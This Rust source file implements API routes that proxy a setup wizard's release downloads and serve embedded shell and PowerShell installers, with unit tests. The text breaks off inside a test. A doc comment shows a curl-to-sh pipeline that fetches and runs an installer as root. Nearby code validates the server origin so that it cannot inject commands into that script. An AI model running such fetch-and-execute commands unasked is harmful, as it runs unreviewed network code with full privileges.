// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 G ROX EOOD
//! `/api/setup/*` — cached GitHub-Releases proxy for the unified
//! `roomler-setup` wizard (tag `setup-v*`, asset prefix
//! `roomler-setup-`) plus the terminal installers
//! `/api/setup/install.{sh,ps1}`. Renamed from
//! `tunnel_wizard_release.rs` in P4b; the legacy `/api/tunnel-wizard/*`
//! family it also served was retired in P4c-2 (its release family
//! stopped at tunnel-wizard-v0.3.0-rc.59 and had been 404ing off the
//! release-page window for months).
//!
//! `GET /api/setup/{latest-release,{platform}/health,{platform}}` —
//! latest-release returns the `setup-v*`-filtered list; health
//! resolves a platform asset manifest; the bare platform route
//! streams the artifact bytes — on Windows the signed wizard EXE itself
//! from the first release that publishes one, the zip with `?format=zip`
//! (FR-129 C2, [`SetupFormat`]). `GET /api/setup/features` (FR-129 B1-s)
//! is the server's word on which install paths a client may offer.
//!
//! Parallel to [`crate::tunnel_release`] (bare CLI tarball)
//! and [`crate::agent_release`] (agent MSIs).

use axum::{
    Json,
    body::Body,
    extract::{Path, Query, State},
    http::{HeaderMap, HeaderValue, StatusCode},
    response::Response,
};
use serde::{Deserialize, Serialize};
use std::{borrow::Cow, time::Duration};

use roomler_core::{ApiError, client_ip::PeerAddr};

use crate::{
    FleetState,
    agent_release::{AgentRelease, AgentReleaseAsset},
    install_trace, releases,
};

#[derive(Deserialize)]
pub struct InstallerQuery {
    #[serde(default = "default_version_latest")]
    pub version: String,
    /// FR-129 C2 — `exe` (the default) or `zip`: which Windows download. See
    /// [`SetupFormat`].
    #[serde(default)]
    pub format: Option<String>,
}

fn default_version_latest() -> String {
    "latest".to_string()
}

/// FR-129 C2 — which Windows download `/api/setup/{platform}` serves.
///
/// The download page promises "a signed EXE with a role picker", and from the
/// first `setup-v*` release that publishes one, `exe` (the default) serves that
/// EXE itself: `roomler-setup-<v>-x86_64-pc-windows-msvc.exe`, the same signed
/// bytes the zip carries. A release without one (every release up to 0.4.189)
/// still serves its zip, so the default can never 404 where it used to answer.
/// `zip` serves the zip whatever the release has — for a network whose proxy
/// refuses an EXE download. Linux and macOS have one download each and ignore
/// the value. Anything else is a 400 naming the two, never a silent guess.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum SetupFormat {
    Exe,
    Zip,
}

impl SetupFormat {
    fn parse(value: Option<&str>) -> Result<SetupFormat, ApiError> {
        match value.map(|v| v.trim().to_ascii_lowercase()).as_deref() {
            None | Some("") | Some("exe") => Ok(SetupFormat::Exe),
            Some("zip") => Ok(SetupFormat::Zip),
            Some(other) => Err(ApiError::BadRequest(format!(
                "unknown format {other:?}; expected exe or zip"
            ))),
        }
    }

    fn wire(self) -> &'static str {
        match self {
            SetupFormat::Exe => "exe",
            SetupFormat::Zip => "zip",
        }
    }
}

#[derive(Debug, Serialize)]
pub struct InstallerHealth {
    pub tag: String,
    pub platform: String,
    pub filename: String,
    pub size: u64,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub digest: Option<String>,
    pub uri: String,
}

// ─── /api/setup — the unified roomler-setup wizard ──────────────────────────

/// `GET /api/setup/latest-release` — recent `setup-v*` releases ONLY
/// (filtered server-side from the mixed tag list the cache holds).
pub async fn setup_latest_release(
    State(state): State<FleetState>,
    PeerAddr(peer): PeerAddr,
    headers: HeaderMap,
) -> Result<Json<Vec<AgentRelease>>, ApiError> {
    // FR-102 P3 — counted by client class; see `install_trace`.
    install_trace::count_fetch(
        &state,
        &headers,
        peer,
        install_trace::asset::SETUP_LATEST_RELEASE,
    );
    let releases = releases::cached(&state).await?;
    let filtered: Vec<AgentRelease> = releases
        .into_iter()
        .filter(|r| r.tag_name.starts_with("setup-v"))
        .collect();
    Ok(Json(filtered))
}

/// The answer of [`setup_features`]: booleans only, every one of them
/// present, so no consumer ever has to default a missing key — and a new
/// key is additive, which an older consumer ignores.
#[derive(Debug, Serialize)]
pub struct SetupFeatures {
    /// `[pairing] enabled` (FR-129 A1): `/api/pair/*` is mounted, so a wizard
    /// may offer "sign in from your browser" instead of a pasted token.
    pub pairing: bool,
    /// `[setup] wizard_unix_daemon` (FR-129 B1-s): the released Roomler Setup
    /// installs the full daemon on Linux and macOS.
    pub wizard_unix_daemon: bool,
    /// `[setup] wizard_pairing` (FR-129 B1-s): the released Roomler Setup
    /// pairs (A3), so a homepage may say "sign in from your browser" — with
    /// `pairing`, never on its own.
    pub wizard_pairing: bool,
}

/// `GET /api/setup/features` — the server-wide switches a client reads before
/// offering an install path (FR-129 B1-s; AC14's server half). Public,
/// unauthenticated, a plain JSON object:
///
/// ```json
/// {"pairing": true, "wizard_unix_daemon": false, "wizard_pairing": false}
/// ```
///
/// * `pairing` mirrors `[pairing] enabled` — a fact about THIS SERVER:
///   whether `/api/pair/*` answers. It is what a wizard reads to offer "Set
///   up in the browser" up front rather than discover the empty 404 on
///   `start`.
/// * The two `[setup]` switches are the operator's assertions about the
///   RELEASED wizard, each default off and flipped after its field run:
///   - `wizard_unix_daemon`: it installs the full daemon on Linux and macOS
///     (B1; AC11). The SPA's enrollment dialog, both homepages and a B1
///     wizard show the Linux and macOS daemon cards only on `true`, so the
///     cards can be turned off without a release (key design B.6).
///   - `wizard_pairing`: it pairs (A3), against this server. Both homepages
///     word the install lead as "sign in from your browser" only on
///     `pairing && wizard_pairing`: `pairing` alone is the server's fact, on
///     by default, and a server image promoted before the first `setup-v*`
///     that carries A3 would otherwise promise a flow the download cannot
///     do.
///
/// ⚠️ Every consumer reads anything but a JSON `true` as **false**: an older
/// server (404), a server with the fleet module unmounted (503), a proxy's
/// HTML error page, a timeout, a string `"true"`. Absent means "offer what
/// the client could do before this route existed" — the daemon wizard on
/// Windows only, the token lead — which is the safe direction: a card or a
/// lead the released wizard cannot honour is the failure these switches
/// exist to prevent, and an older server never advertises one.
///
/// Deliberately NOT a field on `/api/setup/latest-release`: that route
/// answers a bare JSON array every shipped wizard parses as
/// `Vec<AgentRelease>`, and a wrapper object would strand them all. Not
/// counted by `install_trace` either: the SPA reads it on every homepage
/// view, which is not a fetch of anything installable.
pub async fn setup_features(State(state): State<FleetState>) -> Json<SetupFeatures> {
    Json(SetupFeatures {
        pairing: state.settings.pairing.enabled,
        wizard_unix_daemon: state.settings.setup.wizard_unix_daemon,
        wizard_pairing: state.settings.setup.wizard_pairing,
    })
}

/// `GET /api/setup/{platform}/health` — manifest for the unified
/// wizard download matching the requested platform + version (+ the FR-129
/// C2 `format`, which the `uri` carries on). 404s until P4c tags the first
/// `setup-v*` release.
pub async fn setup_installer_health(
    State(state): State<FleetState>,
    Path(platform): Path<String>,
    Query(params): Query<InstallerQuery>,
) -> Result<Json<InstallerHealth>, ApiError> {
    let normalised = normalise_platform(&platform)?;
    let format = SetupFormat::parse(params.format.as_deref())?;
    let releases = releases::cached(&state).await?;
    let release = pick_release_for(&releases, &params.version, "setup-v").ok_or_else(|| {
        ApiError::NotFound(format!(
            "no setup release matching version={}",
            params.version
        ))
    })?;
    let asset = pick_setup_asset(&release.assets, normalised, format).ok_or_else(|| {
        ApiError::NotFound(format!(
            "no setup asset for platform {} in tag {}",
            normalised, release.tag_name
        ))
    })?;
    // The `format` a caller named rides on, so the download resolves as this
    // manifest did; without one the default resolves the same way anyway.
    let format_param = if params.format.is_some() {
        format!("&format={}", format.wire())
    } else {
        String::new()
    };
    Ok(Json(InstallerHealth {
        tag: release.tag_name.clone(),
        platform: normalised.to_string(),
        filename: asset.name.clone(),
        size: asset.size,
        digest: asset.digest.clone(),
        uri: format!(
            "/api/setup/{}?version={}{}",
            normalised, params.version, format_param
        ),
    }))
}

/// `GET /api/setup/{platform}` — streams the unified wizard bytes: on
/// Windows the signed EXE itself (FR-129 C2), or the zip with `format=zip`
/// or from a release that has no EXE asset.
pub async fn setup_installer_proxy(
    State(state): State<FleetState>,
    Path(platform): Path<String>,
    Query(params): Query<InstallerQuery>,
    PeerAddr(peer): PeerAddr,
    headers: HeaderMap,
) -> Result<Response, ApiError> {
    let normalised = normalise_platform(&platform)?;
    let format = SetupFormat::parse(params.format.as_deref())?;
    // FR-102 P3 — the wizard archive itself, usually a browser on the site.
    install_trace::count_fetch(
        &state,
        &headers,
        peer,
        &install_trace::asset::setup(normalised),
    );
    let releases = releases::cached(&state).await?;
    let release = pick_release_for(&releases, &params.version, "setup-v").ok_or_else(|| {
        ApiError::NotFound(format!(
            "no setup release matching version={}",
            params.version
        ))
    })?;
    let asset = pick_setup_asset(&release.assets, normalised, format).ok_or_else(|| {
        ApiError::NotFound(format!(
            "no setup asset for platform {} in tag {}",
            normalised, release.tag_name
        ))
    })?;

    stream_asset(asset).await
}

/// Pick the unified-wizard asset for a platform. Asset naming follows
/// the release-setup.yml matrix with the `roomler-setup-` prefix:
///   - linux-x86_64 — `roomler-setup-*-x86_64-unknown-linux-gnu.tar.gz`
///   - linux-aarch64 — `roomler-setup-*-aarch64-unknown-linux-gnu.tar.gz` (FR-97 P7b)
///   - macos — `roomler-setup-*-universal-apple-darwin.tar.gz`
///   - windows-x86_64 — `roomler-setup-*-x86_64-pc-windows-msvc.exe`, the signed
///     EXE (FR-129 C2), else `roomler-setup-*-x86_64-pc-windows-msvc.zip`; with
///     [`SetupFormat::Zip`] the zip only
///
/// Each arm names its own target triple, so neither Linux arm can take the
/// other's tarball whatever order GitHub lists them in, and the Windows
/// preference does not depend on that order either. A sidecar (`.sha256`,
/// `.asc`) is never a pick.
pub fn pick_setup_asset<'a>(
    assets: &'a [AgentReleaseAsset],
    platform: &str,
    format: SetupFormat,
) -> Option<&'a AgentReleaseAsset> {
    let named = |triple: &str, ext: &str| {
        assets.iter().find(|a| {
            let name = a.name.to_ascii_lowercase();
            name.starts_with("roomler-setup-") && name.contains(triple) && name.ends_with(ext)
        })
    };
    match (platform, format) {
        ("linux-x86_64", _) => named("x86_64-unknown-linux-gnu", ".tar.gz"),
        ("linux-aarch64", _) => named("aarch64-unknown-linux-gnu", ".tar.gz"),
        ("macos", _) => named("universal-apple-darwin", ".tar.gz"),
        ("windows-x86_64", SetupFormat::Exe) => named("x86_64-pc-windows-msvc", ".exe")
            .or_else(|| named("x86_64-pc-windows-msvc", ".zip")),
        ("windows-x86_64", SetupFormat::Zip) => named("x86_64-pc-windows-msvc", ".zip"),
        _ => None,
    }
}

/// The terminal-driven installers (scripts/install.sh + install.ps1),
/// embedded at COMPILE time so the API serves them with no runtime
/// filesystem dependency. Canonical usage:
///
///   curl -fsSL https://roomler.ai/api/setup/install.sh | sh -s -- \
///       --role daemon --token <jwt>
///
/// and the PowerShell twin via `/api/setup/install.ps1`. These are the
/// no-GUI equivalent of the roomler-setup wizard (same resolve →
/// download → verify → install → enroll steps). Short cache so script
/// fixes roll out within minutes of a web deploy.
const INSTALL_SH: &str = include_str!("../../../../scripts/install.sh");
const INSTALL_PS1: &str = include_str!("../../../../scripts/install.ps1");

/// FR-50 — the exact text of each script's server default, held here so the
/// route can substitute the server that is actually serving the script.
///
/// A piped installer cannot see the URL it was fetched from: `curl … | sh` has
/// no `$0`, no filename and no referrer. So without this a self-hosted
/// deployment hands out a script that downloads the agent from the self-hosted
/// server (that part is parameterised and works) and then enrols it against
/// `roomler.ai` — which rejects a token only the self-hosted server can verify,
/// with an error that names the token rather than the server.
///
/// ⚠️ Asserted to appear EXACTLY ONCE in each embedded script by
/// `the_server_default_is_substitutable_exactly_once`. A blind `replace` on a
/// shell script is a silent-failure machine: edit the line and the server keeps
/// serving the old default with nothing failing anywhere. The test is what
/// makes that a build error instead.
const SERVER_NEEDLE_SH: &str = "SERVER=\"https://roomler.ai\"";
const SERVER_NEEDLE_PS1: &str = "[string]$Server = 'https://roomler.ai',";

/// The origin to substitute, or `None` to serve the script unchanged.
///
/// ⚠️ The result is spliced into a shell double-quoted string and a PowerShell
/// single-quoted string, inside a script that then runs as **root / SYSTEM**. A
/// value carrying `"`, `$`, a backtick, a quote or a newline would be command
/// injection into an installer, authored by whoever can set an env var on the
/// API process. So this is a narrow POSITIVE match — scheme, host, optional
/// port, optional trailing slash, nothing else — and anything outside it is
/// refused rather than escaped.
///
/// Refusing is always safe: serving the compiled-in default is exactly the
/// behaviour every deployment had before this existed.
fn substitutable_origin(frontend_url: &str) -> Option<String> {
    let raw = frontend_url.trim();
    let scheme = if raw.starts_with("https://") {
        "https"
    } else if raw.starts_with("http://") {
        "http"
    } else {
        return None;
    };
    let rest = &raw[scheme.len() + 3..];
    // One optional trailing slash is idiomatic in config and harmless. A real
    // PATH is not: the installer appends its own (`$SERVER/api/agent/...`).
    let hostport = rest.strip_suffix('/').unwrap_or(rest);
    if hostport.is_empty() || hostport.len() > 253 {
        return None;
    }
    let (host, port) = match hostport.rsplit_once(':') {
        Some((h, p)) => (h, Some(p)),
        None => (hostport, None),
    };
    if host.is_empty()
        || !host
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'.' || b == b'-' || b == b'_')
    {
        return None;
    }
    if let Some(p) = port
        && (p.is_empty() || p.len() > 5 || !p.bytes().all(|b| b.is_ascii_digit()))
    {
        return None;
    }
    Some(format!("{scheme}://{hostport}"))
}

/// Substitute `needle`'s embedded default for this deployment's own origin, or
/// hand back the script untouched when the origin is unusable or identical.
///
/// Borrows in the identical case on purpose: the hosted service's
/// `frontend_url` IS `https://roomler.ai`, so the overwhelmingly common path
/// allocates nothing and serves byte-identical bytes.
fn with_server_default<'a>(
    script: &'a str,
    needle: &str,
    render: impl Fn(&str) -> String,
    frontend_url: &str,
) -> Cow<'a, str> {
    let Some(origin) = substitutable_origin(frontend_url) else {
        tracing::warn!(
            frontend_url,
            "install script: app.frontend_url is not a plain scheme://host[:port], \
             serving the compiled-in server default unchanged — a device installed \
             from this server will enrol against roomler.ai unless --server is passed"
        );
        return Cow::Borrowed(script);
    };
    let replacement = render(&origin);
    if replacement == needle {
        return Cow::Borrowed(script);
    }
    Cow::Owned(script.replacen(needle, &replacement, 1))
}

fn script_response(body: Cow<'static, str>, content_type: &'static str) -> Response {
    let bytes = body.into_owned();
    Response::builder()
        .status(StatusCode::OK)
        .header("Content-Type", content_type)
        // Still cacheable: the body varies per SERVER, not per request, so a
        // cache in front of one deployment only ever holds that deployment's
        // script. No `Vary` — nothing here reads a request header.
        .header("Cache-Control", "public, max-age=300")
        .body(Body::from(bytes.clone()))
        .unwrap_or_else(|_| Response::new(Body::from(bytes)))
}

/// `GET /api/setup/install.sh` — the Linux/macOS terminal installer.
pub async fn install_script_sh(
    State(state): State<FleetState>,
    PeerAddr(peer): PeerAddr,
    headers: HeaderMap,
) -> Response {
    // FR-102 P3 — a fetch of the script, by client class (curl, a browser…).
    install_trace::count_fetch(&state, &headers, peer, install_trace::asset::INSTALL_SH);
    let body = with_server_default(
        INSTALL_SH,
        SERVER_NEEDLE_SH,
        |o| format!("SERVER=\"{o}\""),
        &state.settings.app.frontend_url,
    );
    script_response(body, "text/x-shellscript; charset=utf-8")
}

/// `GET /api/setup/install.ps1` — the Windows terminal installer.
pub async fn install_script_ps1(
    State(state): State<FleetState>,
    PeerAddr(peer): PeerAddr,
    headers: HeaderMap,
) -> Response {
    install_trace::count_fetch(&state, &headers, peer, install_trace::asset::INSTALL_PS1);
    let body = with_server_default(
        INSTALL_PS1,
        SERVER_NEEDLE_PS1,
        |o| format!("[string]$Server = '{o}',"),
        &state.settings.app.frontend_url,
    );
    script_response(body, "text/plain; charset=utf-8")
}

/// Stream a release asset's bytes through the proxy with download
/// headers.
async fn stream_asset(asset: &AgentReleaseAsset) -> Result<Response, ApiError> {
    let client = reqwest::Client::builder()
        .user_agent(concat!("roomler-ai-api/", env!("CARGO_PKG_VERSION")))
        .timeout(Duration::from_secs(60))
        .build()
        .map_err(|e| ApiError::Internal(format!("reqwest client build: {e}")))?;
    let upstream = client
        .get(&asset.browser_download_url)
        .send()
        .await
        .map_err(|e| ApiError::Internal(format!("upstream wizard fetch failed: {e}")))?;

    let status = upstream.status();
    if !status.is_success() {
        return Err(ApiError::Internal(format!(
            "upstream wizard fetch returned {status}"
        )));
    }
    let content_length = upstream.content_length();
    let content_type = content_type_for(&asset.name);

    let mut builder = Response::builder()
        .status(StatusCode::OK)
        .header("Content-Type", content_type)
        .header(
            "Content-Disposition",
            HeaderValue::from_str(&format!(
                "attachment; filename=\"{}\"",
                sanitise_header_value(&asset.name)
            ))
            .unwrap_or_else(|_| HeaderValue::from_static("attachment")),
        )
        .header("Cache-Control", "public, max-age=3600");
    if let Some(len) = content_length {
        builder = builder.header("Content-Length", len);
    }
    let body = Body::from_stream(upstream.bytes_stream());
    builder
        .body(body)
        .map_err(|e| ApiError::Internal(format!("response build failed: {e}")))
}

fn sanitise_header_value(s: &str) -> String {
    s.chars()
        .filter(|c| !matches!(c, '\r' | '\n' | '"'))
        .collect()
}

fn content_type_for(filename: &str) -> &'static str {
    let lower = filename.to_ascii_lowercase();
    if lower.ends_with(".tar.gz") || lower.ends_with(".tgz") {
        "application/gzip"
    } else if lower.ends_with(".zip") {
        "application/zip"
    } else if lower.ends_with(".exe") {
        "application/vnd.microsoft.portable-executable"
    } else {
        "application/octet-stream"
    }
}

fn normalise_platform(s: &str) -> Result<&'static str, ApiError> {
    match s.to_ascii_lowercase().as_str() {
        // The bare `linux` stays x86_64: every link handed out before FR-97
        // P7b says `/api/setup/linux` and means that one.
        "linux-x86_64" | "linux" | "linux-tar" => Ok("linux-x86_64"),
        // FR-97 P7b — what an aarch64 wizard names itself
        // (`roomler_setup_core::asset_resolver::current_platform`).
        "linux-aarch64" | "linux-arm64" => Ok("linux-aarch64"),
        "macos" | "macos-universal" | "darwin" => Ok("macos"),
        "windows-x86_64" | "windows" | "win" => Ok("windows-x86_64"),
        other => Err(ApiError::BadRequest(format!(
            "unknown platform {other:?}; expected one of linux-x86_64 / linux-aarch64 / macos / windows-x86_64"
        ))),
    }
}

/// Pick a release for a given tag family. `version == "latest"`
/// prefers stable over prerelease within the family; an explicit
/// version matches with or without the family prefix.
fn pick_release_for<'a>(
    releases: &'a [AgentRelease],
    version: &str,
    tag_prefix: &str,
) -> Option<&'a AgentRelease> {
    if version == "latest" {
        releases
            .iter()
            .find(|r| !r.draft && !r.prerelease && r.tag_name.starts_with(tag_prefix))
            .or_else(|| {
                releases
                    .iter()
                    .find(|r| !r.draft && r.tag_name.starts_with(tag_prefix))
            })
    } else {
        let target_with_prefix = format!("{tag_prefix}{}", version.trim_start_matches(tag_prefix));
        let target_bare = version.trim_start_matches(tag_prefix);
        releases.iter().find(|r| {
            r.tag_name == target_with_prefix || r.tag_name == target_bare || r.tag_name == version
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn asset(name: &str) -> AgentReleaseAsset {
        AgentReleaseAsset {
            name: name.to_string(),
            browser_download_url: format!("https://example.com/{name}"),
            size: 1024,
            digest: None,
        }
    }

    fn release(tag: &str, prerelease: bool, asset_names: &[&str]) -> AgentRelease {
        AgentRelease {
            tag_name: tag.to_string(),
            draft: false,
            prerelease,
            published_at: None,
            assets: asset_names.iter().map(|n| asset(n)).collect(),
        }
    }

    #[test]
    fn normalise_platform_accepts_aliases() {
        assert_eq!(normalise_platform("linux").unwrap(), "linux-x86_64");
        assert_eq!(normalise_platform("LINUX-X86_64").unwrap(), "linux-x86_64");
        assert_eq!(
            normalise_platform("linux-aarch64").unwrap(),
            "linux-aarch64"
        );
        assert_eq!(normalise_platform("Linux-ARM64").unwrap(), "linux-aarch64");
        assert_eq!(normalise_platform("Darwin").unwrap(), "macos");
        assert_eq!(normalise_platform("WIN").unwrap(), "windows-x86_64");
    }

    /// FR-97 P7b — the two Linux tarballs never stand in for each other, in
    /// either listing order (GitHub's order is the upload order, which this
    /// code does not control).
    #[test]
    fn pick_setup_asset_keeps_the_linux_arches_apart() {
        let x86 = "roomler-setup-0.4.148-x86_64-unknown-linux-gnu.tar.gz";
        let arm = "roomler-setup-0.4.148-aarch64-unknown-linux-gnu.tar.gz";
        for order in [[arm, x86], [x86, arm]] {
            let assets: Vec<_> = order.iter().map(|n| asset(n)).collect();
            assert_eq!(
                pick_setup_asset(&assets, "linux-x86_64", SetupFormat::Exe)
                    .unwrap()
                    .name,
                x86
            );
            assert_eq!(
                pick_setup_asset(&assets, "linux-aarch64", SetupFormat::Exe)
                    .unwrap()
                    .name,
                arm
            );
        }
        // A release from before P7b has no aarch64 wizard: a clean 404, never
        // the x86_64 tarball.
        let before = vec![asset(x86)];
        assert!(pick_setup_asset(&before, "linux-aarch64", SetupFormat::Exe).is_none());
        assert!(pick_setup_asset(&[asset(arm)], "linux-x86_64", SetupFormat::Exe).is_none());
    }

    /// FR-129 C2 — the release-setup.yml asset set from the first release that
    /// stages the EXE: every platform archive, the EXE beside the zip, and the
    /// sidecars GPG and the checksum step add.
    fn release_with_the_exe(order_exe_last: bool) -> Vec<AgentReleaseAsset> {
        let mut names = vec![
            "roomler-setup-0.4.190-x86_64-unknown-linux-gnu.tar.gz",
            "roomler-setup-0.4.190-x86_64-unknown-linux-gnu.tar.gz.sha256",
            "roomler-setup-0.4.190-x86_64-unknown-linux-gnu.tar.gz.asc",
            "roomler-setup-0.4.190-aarch64-unknown-linux-gnu.tar.gz",
            "roomler-setup-0.4.190-universal-apple-darwin.tar.gz",
            "roomler-setup-0.4.190-universal-apple-darwin.tar.gz.asc",
            "roomler-setup-0.4.190-x86_64-pc-windows-msvc.zip",
            "roomler-setup-0.4.190-x86_64-pc-windows-msvc.zip.sha256",
            "roomler-setup-0.4.190-x86_64-pc-windows-msvc.zip.asc",
            "roomler-setup-0.4.190-x86_64-pc-windows-msvc.exe.sha256",
            "roomler-setup-0.4.190-x86_64-pc-windows-msvc.exe.asc",
            "roomler-release-pubkey.asc",
        ];
        let exe = "roomler-setup-0.4.190-x86_64-pc-windows-msvc.exe";
        if order_exe_last {
            names.push(exe);
        } else {
            names.insert(0, exe);
        }
        names.into_iter().map(asset).collect()
    }

    /// FR-129 C2 — the default is the signed EXE itself, wherever GitHub lists
    /// it; `format=zip` is the zip; the health's file is what the download
    /// streams.
    #[test]
    fn windows_prefers_the_exe_and_zip_forces_the_zip() {
        for exe_last in [true, false] {
            let assets = release_with_the_exe(exe_last);
            assert_eq!(
                pick_setup_asset(&assets, "windows-x86_64", SetupFormat::Exe)
                    .unwrap()
                    .name,
                "roomler-setup-0.4.190-x86_64-pc-windows-msvc.exe"
            );
            assert_eq!(
                pick_setup_asset(&assets, "windows-x86_64", SetupFormat::Zip)
                    .unwrap()
                    .name,
                "roomler-setup-0.4.190-x86_64-pc-windows-msvc.zip"
            );
        }
        assert_eq!(
            content_type_for("roomler-setup-0.4.190-x86_64-pc-windows-msvc.exe"),
            "application/vnd.microsoft.portable-executable"
        );
    }

    /// FR-129 C2 — every release up to 0.4.189 has no EXE asset: the default
    /// keeps serving its zip, exactly as before.
    #[test]
    fn a_release_without_the_exe_keeps_serving_the_zip() {
        let assets: Vec<_> = [
            "roomler-setup-0.4.188-x86_64-pc-windows-msvc.zip",
            "roomler-setup-0.4.188-x86_64-pc-windows-msvc.zip.sha256",
            "roomler-setup-0.4.188-x86_64-pc-windows-msvc.zip.asc",
        ]
        .into_iter()
        .map(asset)
        .collect();
        for format in [SetupFormat::Exe, SetupFormat::Zip] {
            assert_eq!(
                pick_setup_asset(&assets, "windows-x86_64", format)
                    .unwrap()
                    .name,
                "roomler-setup-0.4.188-x86_64-pc-windows-msvc.zip",
                "{format:?}"
            );
        }
        // An EXE-only release (a hypothetical): format=zip is a clean 404,
        // never the EXE under a zip's name.
        let exe_only = vec![asset("roomler-setup-0.4.190-x86_64-pc-windows-msvc.exe")];
        assert!(pick_setup_asset(&exe_only, "windows-x86_64", SetupFormat::Zip).is_none());
    }

    /// FR-129 C2 — a sidecar is never served as the download, whatever is
    /// left once the real assets are gone.
    #[test]
    fn a_sidecar_is_never_picked() {
        let sidecars: Vec<_> = release_with_the_exe(true)
            .into_iter()
            .filter(|a| a.name.ends_with(".sha256") || a.name.ends_with(".asc"))
            .collect();
        assert!(!sidecars.is_empty());
        for platform in ["windows-x86_64", "linux-x86_64", "linux-aarch64", "macos"] {
            for format in [SetupFormat::Exe, SetupFormat::Zip] {
                assert!(
                    pick_setup_asset(&sidecars, platform, format).is_none(),
                    "{platform} {format:?}"
                );
            }
        }
    }

    /// FR-129 C2 — Linux and macOS have one download each; `format` changes
    /// nothing there.
    #[test]
    fn the_linux_and_macos_picks_ignore_the_format() {
        let assets = release_with_the_exe(true);
        for format in [SetupFormat::Exe, SetupFormat::Zip] {
            for (platform, want) in [
                (
                    "linux-x86_64",
                    "roomler-setup-0.4.190-x86_64-unknown-linux-gnu.tar.gz",
                ),
                (
                    "linux-aarch64",
                    "roomler-setup-0.4.190-aarch64-unknown-linux-gnu.tar.gz",
                ),
                (
                    "macos",
                    "roomler-setup-0.4.190-universal-apple-darwin.tar.gz",
                ),
            ] {
                assert_eq!(
                    pick_setup_asset(&assets, platform, format).unwrap().name,
                    want,
                    "{platform} {format:?}"
                );
            }
        }
    }

    /// FR-129 C2 — `exe` is the default, the value is read without case or
    /// padding, and an unknown one is a 400 naming the two.
    #[test]
    fn the_format_param() {
        for v in [None, Some(""), Some("exe"), Some("EXE"), Some(" exe ")] {
            assert_eq!(SetupFormat::parse(v).unwrap(), SetupFormat::Exe, "{v:?}");
        }
        for v in [Some("zip"), Some("ZIP"), Some(" Zip")] {
            assert_eq!(SetupFormat::parse(v).unwrap(), SetupFormat::Zip, "{v:?}");
        }
        for v in ["tar.gz", "msi", "exe.zip", "1"] {
            match SetupFormat::parse(Some(v)) {
                Err(ApiError::BadRequest(m)) => {
                    assert!(m.contains("expected exe or zip"), "{m}")
                }
                other => panic!("{v}: {other:?}"),
            }
        }
        assert_eq!(SetupFormat::Exe.wire(), "exe");
        assert_eq!(SetupFormat::Zip.wire(), "zip");
    }

    #[test]
    fn normalise_platform_rejects_deb_for_wizard() {
        // The wizard EXE isn't packaged as a .deb (operators run it
        // interactively, not via dpkg). Reject the alias outright so
        // a confused caller gets a clear error instead of a 404 on
        // pick_setup_asset.
        assert!(normalise_platform("linux-deb").is_err());
        assert!(normalise_platform("deb").is_err());
    }

    #[test]
    fn normalise_platform_rejects_unknown() {
        assert!(normalise_platform("freebsd").is_err());
        assert!(normalise_platform("").is_err());
    }

    #[test]
    fn pick_release_latest_falls_back_to_prerelease_when_no_stable() {
        let releases = vec![
            release("setup-v0.3.0-rc.1", true, &[]),
            release("agent-v0.3.0", false, &[]),
        ];
        let picked = pick_release_for(&releases, "latest", "setup-v").unwrap();
        assert_eq!(picked.tag_name, "setup-v0.3.0-rc.1");
    }

    #[test]
    fn pick_release_specific_version_accepts_with_or_without_prefix() {
        let releases = vec![release("setup-v0.3.0-rc.1", false, &[])];
        assert!(pick_release_for(&releases, "0.3.0-rc.1", "setup-v").is_some());
        assert!(pick_release_for(&releases, "setup-v0.3.0-rc.1", "setup-v").is_some());
        assert!(pick_release_for(&releases, "0.99.0", "setup-v").is_none());
    }

    #[test]
    fn pick_release_for_setup_prefix_ignores_other_families() {
        let releases = vec![
            release("agent-v0.3.0-rc.195", false, &[]),
            release("tunnel-wizard-v0.3.0-rc.59", false, &[]),
            release(
                "setup-v0.3.0-rc.200",
                false,
                &["roomler-setup-0.3.0-rc.200-x86_64-pc-windows-msvc.zip"],
            ),
        ];
        let picked = pick_release_for(&releases, "latest", "setup-v").unwrap();
        assert_eq!(picked.tag_name, "setup-v0.3.0-rc.200");
        // Dark until the family exists: no setup-v tag → None (the
        // handlers turn this into a clean 404).
        let none = pick_release_for(&releases[..2], "latest", "setup-v");
        assert!(none.is_none());
    }

    #[test]
    fn pick_setup_asset_requires_setup_prefix_and_matches_triples() {
        let assets = vec![
            // RETIRED-NAME-ANCHOR(26): roomler-tunnel-installer is a PUBLISHED
            // release asset (FR-21 D6). It appears twice in this test on
            // purpose: once in the candidate list and once alone, to prove the
            // legacy wizard asset can NEVER satisfy the setup pick.
            asset("roomler-tunnel-installer-0.3.0-x86_64-pc-windows-msvc.zip"),
            asset("roomler-setup-0.3.0-x86_64-pc-windows-msvc.zip"),
            asset("roomler-setup-0.3.0-x86_64-pc-windows-msvc.zip.sha256"),
            asset("roomler-setup-0.3.0-x86_64-unknown-linux-gnu.tar.gz"),
            asset("roomler-setup-0.3.0-universal-apple-darwin.tar.gz"),
        ];
        assert_eq!(
            pick_setup_asset(&assets, "windows-x86_64", SetupFormat::Exe)
                .unwrap()
                .name,
            "roomler-setup-0.3.0-x86_64-pc-windows-msvc.zip"
        );
        assert_eq!(
            pick_setup_asset(&assets, "linux-x86_64", SetupFormat::Exe)
                .unwrap()
                .name,
            "roomler-setup-0.3.0-x86_64-unknown-linux-gnu.tar.gz"
        );
        assert_eq!(
            pick_setup_asset(&assets, "macos", SetupFormat::Exe)
                .unwrap()
                .name,
            "roomler-setup-0.3.0-universal-apple-darwin.tar.gz"
        );
        // The legacy wizard asset must never satisfy the setup pick.
        let legacy_only = vec![asset(
            "roomler-tunnel-installer-0.3.0-x86_64-pc-windows-msvc.zip",
        )];
        for format in [SetupFormat::Exe, SetupFormat::Zip] {
            assert!(pick_setup_asset(&legacy_only, "windows-x86_64", format).is_none());
        }
    }

    #[test]
    fn embedded_install_scripts_look_right() {
        // Shape locks on the compile-time-embedded terminal installers
        // — a broken include path or an emptied script fails here, not
        // in production.
        assert!(INSTALL_SH.starts_with("#!/bin/sh"), "install.sh shebang");
        assert!(INSTALL_SH.contains("/api/agent/latest-release"));
        assert!(INSTALL_SH.contains("--role"));
        assert!(INSTALL_PS1.contains("daemon-user"));
        assert!(INSTALL_PS1.contains("/api/agent/installer/"));
        assert!(INSTALL_PS1.contains("tunnel-client"));
        // The served scripts must never embed a JWT (base64url JWTs
